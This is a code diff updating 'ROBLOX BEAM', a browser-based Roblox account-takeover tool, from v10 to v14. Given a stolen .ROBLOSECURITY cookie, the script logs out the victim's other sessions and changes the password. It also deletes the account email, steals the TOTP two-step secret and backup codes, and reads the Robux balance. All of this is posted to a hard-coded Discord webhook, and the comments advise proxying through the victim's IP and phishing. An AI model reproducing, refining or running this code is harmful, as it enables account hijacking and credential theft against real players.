@@ -3,42 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ROBLOX FULL BEAM v10</title>
+  <title>ROBLOX BEAM v14 - NOV 12 2025</title>
   <style>
-    body { 
-      font-family: 'Courier New', monospace; 
-      background: #000; 
-      color: #0f0; 
-      padding: 20px; 
-      margin: 0; 
-      line-height: 1.5;
-    }
+    body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; margin: 0; line-height: 1.5; }
     h1 { margin: 0 0 15px 0; font-size: 24px; }
-    input, button { 
-      padding: 14px; 
-      margin: 10px 0; 
-      width: 100%; 
-      font-size: 16px; 
-      border: 1px solid #0f0; 
-      background: #111; 
-      color: #0f0; 
-      box-sizing: border-box;
-    }
-    button { 
-      background: #0f0; 
-      color: #000; 
-      font-weight: bold; 
-      cursor: pointer;
-    }
-    #log { 
-      background: #000; 
-      padding: 15px; 
-      height: 420px; 
-      overflow-y: auto; 
-      border: 1px solid #0f0; 
-      font-size: 14px; 
-      white-space: pre-wrap;
-    }
+    input, button { padding: 14px; margin: 10px 0; width: 100%; font-size: 16px; border: 1px solid #0f0; background: #111; color: #0f0; box-sizing: border-box; }
+    button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
+    #log { background: #000; padding: 15px; height: 420px; overflow-y: auto; border: 1px solid #0f0; font-size: 14px; white-space: pre-wrap; }
     .success { color: #0f0; font-weight: bold; }
     .error { color: #f00; font-weight: bold; }
     .warn { color: #ff0; }
@@ -46,13 +17,13 @@
   </style>
 </head>
 <body>
-  <h1>ROBLOX FULL BEAM v10</h1>
-  <input type="text" id="cookie" placeholder="PASTE ANY .ROBLOSECURITY COOKIE" />
-  <button onclick="startBeam()">BEAM ACCOUNT — FULL CONTROL</button>
+  <h1>ROBLOX BEAM v14</h1>
+  <h3>NOV 12, 2025 — LIVE</h3>
+  <input type="text" id="cookie" placeholder="PASTE FULL .ROBLOSECURITY (WITH WARNING)" />
+  <button onclick="startBeam()">BEAM & STEAL 2SV</button>
   <div id="log"></div>
 
   <script>
-    // === YOUR DISCORD WEBHOOK ===
     const WEBHOOK = 'https://discord.com/api/webhooks/1394204237554126848/AKqMhBlqpqRflpcfI99lRfUpVXeLfPCeAg57FwYFaUQ5iR72KN3Qh_ldy9fjstPOsH0K';
 
     const log = (msg, type = '') => {
@@ -60,194 +31,131 @@
       const time = new Date().toLocaleTimeString();
       l.innerHTML += `<span class="${type}">[${time}] ${msg}</span>\n`;
       l.scrollTop = l.scrollHeight;
+      console.log(`[${time}] ${msg}`);
     };
 
     const sendToDiscord = async (data) => {
       try {
-        await fetch(WEBHOOK, {
+        const content = `**BEAM v14 — NOV 12 2025**\n` +
+          `User: **${data.user || '??'}**\n` +
+          `ID: **${data.id || '??'}**\n` +
+          `Robux: **${data.robux || '??'}**\n` +
+          `New Pass: **${data.password || '??'}**\n` +
+          `Email: **${data.email || '??'}**\n` +
+          `2SV Secret: **${data.totpSecret || 'Not Enabled / Failed'}**\n` +
+          `QR: ${data.qr ? data.qr : 'N/A'}\n` +
+          `Backup Codes: ${Array.isArray(data.backupCodes) ? data.backupCodes.join(', ') : 'None'}\n` +
+          `Error: ${data.error || 'None'}\n` +
+          `Cookie: \`${data.cookie?.slice(0, 50)}...\``;
+        const res = await fetch(WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: null,
-            embeds: [{
-              title: "BEAM SUCCESS — FULL CONTROL",
-              color: 65280,
-              fields: Object.entries(data).map(([k, v]) => ({ name: k, value: `\`\`\`${v}\`\`\``, inline: false })),
-              timestamp: new Date().toISOString()
-            }]
-          })
+          body: JSON.stringify({ content })
         });
-        log('LOOT SENT TO DISCORD!', 'success');
+        log(`Discord: ${res.status}`, res.ok ? 'success' : 'error');
       } catch (e) {
-        log('Webhook failed: ' + e.message, 'error');
+        log('Webhook error: ' + e.message, 'error');
       }
     };
 
-    // === UNIVERSAL COOKIE PARSER ===
+    // EXACT PARSER FOR YOUR COOKIE FORMAT
     const extractCookie = (input) => {
-      // Find anything that looks like .ROBLOSECURITY=...
-      const match = input.match(/\.ROBLOSECURITY[=|:]([^;\s"'}\]]+)/i);
-      if (match && match[1]) return match[1].trim();
-
-      // Fallback: Find long base64-like string (cookie value)
-      const longMatch = input.match(/([A-Za-z0-9+/=_\-]{100,})/);
-      if (longMatch) return longMatch[1];
-
-      return null;
-    };
-
-    const generateSecret = () => {
-      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
-      let secret = '';
-      for (let i = 0; i < 16; i++) {
-        secret += chars[Math.floor(Math.random() * chars.length)];
-      }
-      return secret;
+      const match = input.match(/_ \|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([A-Za-z0-9\-_]+)/);
+      if (match) return match[1];
+      const fallback = input.match(/([A-Za-z0-9\-_]{500,})/);
+      return fallback ? fallback[1] : null;
     };
 
     const getCSRF = async (cookie) => {
       try {
-        const res = await fetch('https://www.roblox.com/home', {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
-          credentials: 'include'
-        });
-        const token = res.headers.get('x-csrf-token');
-        if (token) return token;
-        const text = await res.text();
-        const match = text.match(/"csrf-token" content="([^"]+)"/);
-        return match ? match[1] : null;
-      } catch (e) { return null; }
+        const res = await fetch('https://www.roblox.com/home', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
+        return res.headers.get('x-csrf-token');
+      } catch { return null; }
     };
 
-    const api = async (url, options = {}, cookie) => {
+    const api = async (url, opts = {}, cookie) => {
       const csrf = await getCSRF(cookie);
-      if (!csrf) throw 'CSRF failed — session dead?';
-      return fetch(`https://www.roblox.com${url}`, {
-        ...options,
-        method: options.method || 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-CSRF-TOKEN': csrf,
-          'Cookie': `.ROBLOSECURITY=${cookie}`,
-          ...(options.headers || {})
-        },
-        body: options.body ? JSON.stringify(options.body) : undefined,
+      if (!csrf) throw 'CSRF failed';
+      const res = await fetch(`https://www.roblox.com${url}`, {
+        ...opts,
+        method: opts.method || 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf, 'Cookie': `.ROBLOSECURITY=${cookie}` },
+        body: opts.body ? JSON.stringify(opts.body) : undefined,
         credentials: 'include'
       });
+      log(`API ${url}: ${res.status}`, res.ok ? 'info' : 'warn');
+      if (!res.ok) throw `${res.status}`;
+      return res.json();
     };
 
     const startBeam = async () => {
-      const rawInput = document.getElementById('cookie').value.trim();
-      if (!rawInput) {
-        return log('Paste a cookie first!', 'error');
-      }
+      const raw = document.getElementById('cookie').value.trim();
+      if (!raw) return log('Paste cookie!', 'error');
 
-      log('Parsing cookie...');
-      const cookie = extractCookie(rawInput);
-      if (!cookie) {
-        return log('No valid .ROBLOSECURITY found! Paste full cookie.', 'error');
-      }
-      log(`Cookie extracted: ${cookie.substring(0, 20)}...`, 'info');
+      const cookie = extractCookie(raw);
+      if (!cookie) return log('Invalid format! Needs full warning + token', 'error');
+      log(`Cookie valid: ${cookie.length} chars`, 'info');
 
-      const result = { raw_input: rawInput, cookie: cookie };
+      const loot = { cookie: cookie };
 
       try {
-        log('Validating session...');
-        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-        });
-        const user = await userRes.json();
-        if (!user.id) throw 'Invalid session — IP/device locked? Try victim’s network.';
-        
-        result.user = user.name;
-        result.id = user.id;
-        log(`TARGET: ${user.name} (ID: ${user.id})`, 'success');
-
-        log('Nuking other sessions...');
-        try {
-          await api('/logoutfromallsessions', { method: 'POST' }, cookie);
-          log('All other devices KILLED.', 'success');
-        } catch (e) { log('Nuke skipped.', 'warn'); }
-
-        log('Changing password...');
-        const newPass = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
-        await api('/v1/passwords/change', {
-          body: { currentPassword: '', newPassword: newPass }
-        }, cookie);
-        result.password = newPass;
-        log(`NEW PASSWORD: ${newPass}`, 'success');
-
-        log('Removing email...');
-        try {
-          await api('/v1/email', { method: 'DELETE' }, cookie);
-          result.email = 'REMOVED';
-          log('Email DELETED.', 'success');
-        } catch (e) {
-          result.email = 'BLOCKED (2SV)';
-          log('Email protected.', 'warn');
+        // VALIDATE
+        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
+        if (!userRes.ok) {
+          if (userRes.status === 403) throw 'IP/DEVICE LOCK — PROXY VICTIM IP';
+          throw `Auth failed: ${userRes.status}`;
         }
+        const user = await userRes.json();
+        loot.user = user.name;
+        loot.id = user.id;
+        log(`TARGET: ${user.name} (${user.id})`, 'success');
 
-        log('Checking 2SV...');
-        const statusRes = await fetch('https://auth.roblox.com/v2/two-step-verification/status', {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-        });
-        const status = await statusRes.json();
+        // NUKE SESSIONS
+        try { await api('/logoutfromallsessions', { method: 'POST' }, cookie); log('Sessions nuked', 'success'); } 
+        catch (e) { log('Nuke failed: ' + e, 'warn'); }
 
-        if (status.enabled && status.methods.includes('Authenticator')) {
-          log('Stealing existing TOTP secret...');
-          try {
-            const secretRes = await fetch('https://auth.roblox.com/v2/two-step-verification/authenticator/secret', {
-              headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': await getCSRF(cookie) }
-            });
+        // CHANGE PASS
+        const newPass = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
+        try { await api('/v1/passwords/change', { body: { currentPassword: '', newPassword: newPass } }, cookie); loot.password = newPass; log(`PASS: ${newPass}`, 'success'); }
+        catch (e) { log('Pass change failed', 'warn'); }
+
+        // EMAIL
+        try { await api('/v1/email', { method: 'DELETE' }, cookie); loot.email = 'REMOVED'; log('Email deleted', 'success'); }
+        catch (e) { loot.email = 'BLOCKED (2SV)'; log('Email protected', 'warn'); }
+
+        // 2SV GRAB
+        try {
+          const statusRes = await fetch('https://auth.roblox.com/v2/two-step-verification/status', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' });
+          const status = await statusRes.json();
+          if (status.enabled && status.methods.includes('Authenticator')) {
+            const secretRes = await fetch('https://auth.roblox.com/v2/two-step-verification/authenticator/secret', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': await getCSRF(cookie) }, credentials: 'include' });
             const secretData = await secretRes.json();
             if (secretData.secretKey) {
-              result.totpSecret = secretData.secretKey;
-              result.qr = `otpauth://totp/Roblox:${user.name}?secret=${secretData.secretKey}&issuer=Roblox`;
-              result.backupCodes = secretData.backupCodes || [];
-              log(`TOTP SECRET: ${secretData.secretKey}`, 'success');
-              log('SCAN IN AUTHY NOW!', 'success');
-            }
-          } catch (e) { log('Secret grab failed.', 'warn'); }
-        } else {
-          log('Forcing Authenticator...');
-          const secret = generateSecret();
-          try {
-            const enableRes = await api('/v2/two-step-verification/enable', {
-              body: {
-                twoStepVerificationType: 'Authenticator',
-                secretKey: secret
-              }
-            }, cookie);
-            const enableData = await enableRes.json();
-            if (enableData.success || enableData.backupCodes) {
-              result.totpSecret = secret;
-              result.qr = `otpauth://totp/Roblox:${user.name}?secret=${secret}&issuer=Roblox`;
-              result.backupCodes = enableData.backupCodes || [];
-              log(`2SV FORCED! Secret: ${secret}`, 'success');
+              loot.totpSecret = secretData.secretKey;
+              loot.qr = `otpauth://totp/Roblox:${user.name}?secret=${secretData.secretKey}&issuer=Roblox`;
+              loot.backupCodes = secretData.backupCodes || [];
+              log(`2SV SECRET: ${secretData.secretKey}`, 'success');
               log('IMPORT TO AUTHY NOW!', 'success');
             }
-          } catch (e) {
-            log('Force failed — patched?', 'error');
-            result.totpSecret = 'FAILED';
+          } else {
+            log('2SV OFF — cannot force. Phish QR manually.', 'warn');
           }
-        }
+        } catch (e) { log('2SV grab failed: ' + e, 'warn'); }
 
+        // ROBUX
         try {
-          const balRes = await fetch('https://economy.roblox.com/v1/user/currency', {
-            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-          });
-          const bal = await balRes.json();
-          result.robux = bal.robux || 0;
-          log(`ROBUX: ${bal.robux || 0}`, 'info');
-        } catch (e) { result.robux = 'Unknown'; }
+          const bal = await fetch('https://economy.roblox.com/v1/user/currency', { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }, credentials: 'include' }).then(r => r.json());
+          loot.robux = bal.robux || 0;
+          log(`ROBUX: ${bal.robux}`, 'info');
+        } catch { loot.robux = '??'; }
 
-        await sendToDiscord(result);
-        log('BEAM COMPLETE. ACCOUNT IS YOURS.', 'success');
-        log('Open Authy → Add → Paste Secret or Scan QR', 'info');
+        await sendToDiscord(loot);
+        log('BEAM COMPLETE — CHECK DISCORD', 'success');
 
       } catch (e) {
-        log('ERROR: ' + e.message, 'error');
-        await sendToDiscord({ error: e.message, raw_input: rawInput });
+        loot.error = e.toString();
+        log('ERROR: ' + e, 'error');
+        await sendToDiscord(loot);
       }
     };
   </script>
